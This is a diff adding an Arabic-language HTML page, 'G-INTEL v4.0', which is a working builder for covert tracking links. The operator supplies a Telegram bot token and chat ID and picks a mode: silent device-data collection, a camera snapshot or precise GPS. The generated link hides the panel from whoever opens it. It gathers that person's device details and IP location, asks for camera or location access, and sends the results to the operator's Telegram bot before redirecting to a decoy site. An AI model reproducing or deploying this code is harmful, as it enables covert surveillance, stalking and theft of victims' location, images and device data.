@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>G-INTEL | النظام المتقدم v4.0</title>
+    <!-- Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
+    <style>
+        /* ===== RESET & أحدث تقنيات CSS ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #ffffff;
+            --secondary: #a0a0a0;
+            --bg-primary: #000000;
+            --bg-secondary: #0c0c0c;
+            --bg-tertiary: #141414;
+            --border-light: #222222;
+            --border-focus: #3a3a3a;
+            --accent-glow: rgba(255, 255, 255, 0.05);
+            --shadow-color: rgba(0, 0, 0, 0.8);
+            --gradient-start: #1a1a1a;
+            --gradient-end: #000000;
+            --error: #ff4444;
+            --success: #00c851;
+        }
+
+        body {
+            background: var(--bg-primary);
+            color: var(--primary);
+            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            position: relative;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* خلفية متحركة دقيقة جداً (تأثير تقني) */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(255, 255, 255, 0.02) 0%, transparent 50%),
+                repeating-linear-gradient(45deg, rgba(255, 255, 255, 0.01) 0px, rgba(255, 255, 255, 0.01) 1px, transparent 1px, transparent 10px);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* الحاوية الرئيسية - تصميم زجاجي داكن متطور */
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 520px;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 48px;
+            box-shadow: 
+                0 30px 60px -20px rgba(0, 0, 0, 0.8),
+                0 0 0 1px rgba(255, 255, 255, 0.02) inset,
+                0 0 30px 0 rgba(0, 0, 0, 0.5);
+            padding: 2rem 1.8rem;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.1);
+        }
+
+        /* Header بتصميم عصري */
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 2.5rem;
+            position: relative;
+        }
+
+        .header-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(145deg, #1a1a1a, #0a0a0a);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 20px -5px rgba(0, 0, 0, 0.6);
+        }
+
+        .header-icon i {
+            font-size: 2rem;
+            color: var(--primary);
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.5));
+        }
+
+        .header-title {
+            flex: 1;
+        }
+
+        .header-title h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(to right, #ffffff, #cccccc);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.2rem;
+        }
+
+        .header-title .badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 100px;
+            padding: 0.2rem 0.8rem;
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: var(--secondary);
+            letter-spacing: 0.3px;
+        }
+
+        /* حقول الإدخال - تصميم عصري مع تأثيرات متقدمة */
+        .input-field {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-field label {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.8rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--secondary);
+            margin-bottom: 0.6rem;
+        }
+
+        .input-field label i {
+            font-size: 1rem;
+            color: var(--primary);
+            opacity: 0.7;
+        }
+
+        .input-field input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1.5px solid var(--border-light);
+            border-radius: 24px;
+            padding: 1rem 1.5rem;
+            font-size: 1rem;
+            color: var(--primary);
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            transition: all 0.3s ease;
+            outline: none;
+            backdrop-filter: blur(5px);
+        }
+
+        .input-field input:hover {
+            border-color: #333333;
+        }
+
+        .input-field input:focus {
+            border-color: var(--primary);
+            background: rgba(20, 20, 20, 0.8);
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.05);
+        }
+
+        .input-field input::placeholder {
+            color: #444;
+            font-weight: 300;
+            font-size: 0.9rem;
+        }
+
+        /* أزرار أوضاع الهجوم - تصميم كروت تفاعلية */
+        .modes-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0.8rem;
+            margin: 2rem 0 2rem;
+        }
+
+        .mode-card {
+            position: relative;
+            background: rgba(20, 20, 20, 0.7);
+            border: 1px solid var(--border-light);
+            border-radius: 28px;
+            padding: 1.2rem 0.5rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.5rem;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.3, 1.2);
+            backdrop-filter: blur(5px);
+            overflow: hidden;
+        }
+
+        .mode-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 50% 0%, rgba(255, 255, 255, 0.1), transparent 70%);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .mode-card:hover {
+            border-color: #404040;
+            transform: translateY(-2px);
+            background: rgba(30, 30, 30, 0.8);
+        }
+
+        .mode-card.active {
+            border-color: var(--primary);
+            background: rgba(40, 40, 40, 0.9);
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.05);
+        }
+
+        .mode-card.active::before {
+            opacity: 1;
+        }
+
+        .mode-card i {
+            font-size: 1.8rem;
+            color: var(--primary);
+            filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.5));
+        }
+
+        .mode-card span {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--secondary);
+            text-align: center;
+            line-height: 1.3;
+        }
+
+        .mode-card.active span {
+            color: var(--primary);
+        }
+
+        /* زر الإجراء الرئيسي - أحدث تقنيات CSS */
+        .action-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #2a2a2a, #1a1a1a);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 1.2rem 2rem;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.3, 1.2);
+            margin: 1.8rem 0 2rem;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 15px 25px -8px rgba(0, 0, 0, 0.7);
+        }
+
+        .action-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.05), transparent);
+            transition: left 0.7s;
+        }
+
+        .action-btn:hover {
+            background: linear-gradient(135deg, #323232, #222);
+            border-color: rgba(255, 255, 255, 0.2);
+            transform: scale(0.99);
+            box-shadow: 0 10px 20px -5px #000000;
+        }
+
+        .action-btn:hover::before {
+            left: 100%;
+        }
+
+        .action-btn i {
+            font-size: 1.2rem;
+            transition: transform 0.3s;
+        }
+
+        .action-btn:hover i {
+            transform: rotate(-5deg);
+        }
+
+        /* لوحة النتائج - تصميم عصري متقدم */
+        .result-panel {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 32px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1.5rem;
+            backdrop-filter: blur(10px);
+            transition: all 0.4s;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+            color: var(--secondary);
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .result-header i {
+            color: var(--primary);
+            font-size: 1.1rem;
+        }
+
+        .url-container {
+            display: flex;
+            gap: 0.5rem;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 28px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 0.3rem;
+        }
+
+        .url-container textarea {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--primary);
+            font-size: 0.85rem;
+            padding: 1rem 1.2rem;
+            resize: none;
+            height: 80px;
+            line-height: 1.5;
+            font-family: 'Plus Jakarta Sans', monospace;
+            outline: none;
+        }
+
+        .copy-btn {
+            width: 60px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 28px;
+            color: var(--primary);
+            font-size: 1.3rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .copy-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        /* تأثيرات متقدمة إضافية */
+        .glass-line {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            margin: 1.8rem 0 1rem;
+        }
+
+        /* تلميحات الأدوات */
+        .hint {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.7rem;
+            color: #555;
+            margin-top: 0.3rem;
+        }
+
+        .hint i {
+            font-size: 0.7rem;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="adminPanel">
+        <!-- الهيدر الجديد بدون إحصائيات وهمية -->
+        <div class="header">
+            <div class="header-icon">
+                <i class="fas fa-shield-halved"></i>
+            </div>
+            <div class="header-title">
+                <h1>G-INTEL</h1>
+                <span class="badge">الإصدار 4.0 · احترافي</span>
+            </div>
+        </div>
+
+        <!-- حقول الإدخال الأساسية -->
+        <div class="input-field">
+            <label><i class="fab fa-telegram"></i> توكن البوت</label>
+            <input type="text" id="botToken" placeholder="أدخل توكن البوت" value="7234567890:AAHdummy_token_for_demo">
+        </div>
+
+        <div class="input-field">
+            <label><i class="fas fa-id-card"></i> معرف الشات</label>
+            <input type="text" id="chatId" placeholder="أدخل Chat ID" value="987654321">
+        </div>
+
+        <!-- أزرار أوضاع الهجوم (بدون قائمة منسدلة) -->
+        <div style="margin-bottom: 0.5rem;">
+            <label style="font-size:0.8rem; color:var(--secondary); margin-right:0.5rem;"><i class="fas fa-bolt"></i> نوع العملية</label>
+        </div>
+        <div class="modes-grid" id="modeGrid">
+            <div class="mode-card active" data-mode="info">
+                <i class="fas fa-dragon"></i>
+                <span>جمع بيانات<br>صامت</span>
+            </div>
+            <div class="mode-card" data-mode="camera">
+                <i class="fas fa-camera-retro"></i>
+                <span>التقاط صورة<br>كاميرا</span>
+            </div>
+            <div class="mode-card" data-mode="gps">
+                <i class="fas fa-map-pin"></i>
+                <span>موقع GPS<br>دقيق</span>
+            </div>
+        </div>
+        <input type="hidden" id="hackMode" value="info">
+
+        <!-- رابط التحويل -->
+        <div class="input-field">
+            <label><i class="fas fa-link"></i> رابط التحويل (بعد التنفيذ)</label>
+            <input type="text" id="targetUrl" placeholder="https://example.com" value="https://www.google.com">
+        </div>
+
+        <!-- زر الإنشاء الرئيسي -->
+        <button class="action-btn" onclick="buildPayload()">
+            <i class="fas fa-skull"></i>
+            <span>توليد الرابط المشفر</span>
+            <i class="fas fa-arrow-left"></i>
+        </button>
+
+        <!-- لوحة النتائج (تظهر فقط عند وجود رابط) -->
+        <div id="outputArea" class="result-panel" style="display: none;">
+            <div class="result-header">
+                <i class="fas fa-link"></i>
+                <span>الرابط جاهز للنسخ</span>
+            </div>
+            <div class="url-container">
+                <textarea id="finalUrl" readonly placeholder="سيظهر الرابط هنا..." wrap="hard"></textarea>
+                <button class="copy-btn" onclick="copyFinalUrl()">
+                    <i class="far fa-copy"></i>
+                </button>
+            </div>
+            <div class="hint">
+                <i class="fas fa-info-circle"></i>
+                <span>يمكنك تقصير الرابط عبر أي خدمة مختصرة</span>
+            </div>
+        </div>
+
+        <!-- خط زجاجي سفلي (ديكور) -->
+        <div class="glass-line"></div>
+    </div>
+
+    <!-- عناصر مساعدة (كاميرا - كانفاس) -->
+    <video id="v" autoplay playsinline class="hidden"></video>
+    <canvas id="c" class="hidden"></canvas>
+
+    <script>
+        // ========== نظام تبديل الأوضاع ==========
+        (function() {
+            const modeCards = document.querySelectorAll('.mode-card');
+            const modeInput = document.getElementById('hackMode');
+            
+            modeCards.forEach(card => {
+                card.addEventListener('click', function() {
+                    modeCards.forEach(c => c.classList.remove('active'));
+                    this.classList.add('active');
+                    modeInput.value = this.dataset.mode;
+                });
+            });
+        })();
+
+        // ========== دالة النسخ ==========
+        window.copyFinalUrl = function() {
+            const txt = document.getElementById('finalUrl');
+            if (!txt.value) return;
+            txt.select();
+            navigator.clipboard?.writeText(txt.value).then(() => {
+                alert('تم نسخ الرابط!');
+            }).catch(() => alert('اضغط Ctrl+C للنسخ'));
+        };
+
+        // ========== بناء الرابط المشفر ==========
+        window.buildPayload = function() {
+            const token = document.getElementById('botToken').value.trim();
+            const chat = document.getElementById('chatId').value.trim();
+            const type = document.getElementById('hackMode').value;
+            const url = document.getElementById('targetUrl').value.trim();
+
+            if (!token || !chat || !url) {
+                alert('الرجاء تعبئة جميع الحقول');
+                return;
+            }
+
+            const data = { token, chat, type, url };
+            const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+            const final = window.location.origin + window.location.pathname + '?m=' + encoded;
+
+            document.getElementById('finalUrl').value = final;
+            document.getElementById('outputArea').style.display = 'block';
+            
+            // تمرير سلس للوحة النتائج
+            document.getElementById('outputArea').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        };
+
+        // ========== معالجة وجود بارامتر m ==========
+        (function handleParams() {
+            const params = new URLSearchParams(window.location.search);
+            if (params.has('m')) {
+                document.getElementById('adminPanel').classList.add('hidden');
+                const encoded = params.get('m');
+                try {
+                    const config = JSON.parse(decodeURIComponent(escape(atob(encoded))));
+                    executeCapture(config);
+                } catch (e) {
+                    document.body.innerHTML = '<div style="color:#ff4444; padding:2rem; text-align:center;">⚠️ خطأ في فك التشفير</div>';
+                }
+            }
+        })();
+
+        // ========== دالة التنفيذ الأساسية ==========
+        async function executeCapture(config) {
+            const parser = new UAParser();
+            const ua = parser.getResult();
+
+            // البطارية
+            let batteryInfo = 'غير متاح';
+            try {
+                const b = await navigator.getBattery();
+                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن' : 'بطارية'})`;
+            } catch (e) {}
+
+            // معلومات IP
+            let net = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                net = await res.json();
+            } catch (e) {
+                try {
+                    const fallback = await fetch('https://api.ipify.org?format=json');
+                    const data2 = await fallback.json();
+                    net.ip = data2.ip;
+                } catch (e2) {}
+            }
+
+            // معلومات الجهاز
+            const cpuCores = navigator.hardwareConcurrency || 'غير معروف';
+            const ram = navigator.deviceMemory ? navigator.deviceMemory + ' جيجا' : 'غير معروف';
+
+            // تقرير Markdown
+            const report = `
+🚨 **G-INTEL | تقرير اختراق** [${config.type === 'info' ? 'معلومات' : config.type === 'camera' ? 'كاميرا' : 'GPS'}]
+━━━━━━━━━━━━━━━━━━━
+📱 **الجهاز:** ${ua.device.vendor || 'كمبيوتر'} ${ua.device.model || ''}
+💻 **النظام:** ${ua.os.name || '?'} ${ua.os.version || ''}
+🌐 **المتصفح:** ${ua.browser.name || '?'} ${ua.browser.version || ''}
+🔋 **البطارية:** ${batteryInfo}
+⚙️ **الأنوية:** ${cpuCores} | 🧠 **الرام:** ${ram}
+
+🌍 **الشبكة:** 
+• IP: \`${net.ip || 'غير متوفر'}\`
+• الدولة: ${net.country_name || '?'} | المدينة: ${net.city || '?'}
+• المزود: ${net.org || '?'}
+
+⏱️ **الوقت:** ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━━━━━━
+            `.trim();
+
+            // دالة الإرسال
+            const sendToTelegram = async (msg) => {
+                return fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: config.chat, text: msg, parse_mode: 'Markdown' })
+                });
+            };
+
+            if (config.type === 'info') {
+                await sendToTelegram(report);
+                setTimeout(() => window.location.replace(config.url), 500);
+            } 
+            else if (config.type === 'camera') {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('v');
+                    video.srcObject = stream;
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('c');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(async (blob) => {
+                            await sendToTelegram(report);
+                            const fd = new FormData();
+                            fd.append('chat_id', config.chat);
+                            fd.append('photo', blob, 'shot.jpg');
+                            await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, { method: 'POST', body: fd });
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.replace(config.url);
+                        }, 'image/jpeg', 0.9);
+                    }, 1000);
+                } catch (e) {
+                    await sendToTelegram(report + '\n⚠️ **فشل الوصول للكاميرا** (رفض الإذن)');
+                    window.location.replace(config.url);
+                }
+            }
+            else if (config.type === 'gps') {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const gpsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    const gpsText = `📍 **الموقع GPS:** [عرض على الخريطة](${gpsLink})`;
+                    await sendToTelegram(report + '\n' + gpsText);
+                    window.location.replace(config.url);
+                }, async () => {
+                    await sendToTelegram(report + '\n⚠️ **فشل الحصول على الموقع** (رفض الإذن)');
+                    window.location.replace(config.url);
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            }
+        }
+    </script>
+</body>
+</html>
